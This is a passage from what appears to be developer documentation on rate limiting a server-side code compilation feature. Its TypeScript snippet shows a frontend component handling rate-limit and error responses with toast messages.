  return compileCode(input.code, userId)
}
```

### Step 4: Update Frontend to Handle Errors

```typescript
// In your component
const result = await executeCode({ code, compiler: 'server' })

if (result.rateLimit?.exceeded) {
  toast.error(
    `Rate limit exceeded. ${result.rateLimit.upgradeUrl ? 'Upgrade for more.' : 'Please wait.'}`
  )
  return
}

if (result.error) {
  toast.error(result.error)
  return
}
```

---

**Last Updated:** 2026-01-24
**Maintainer:** Development Team
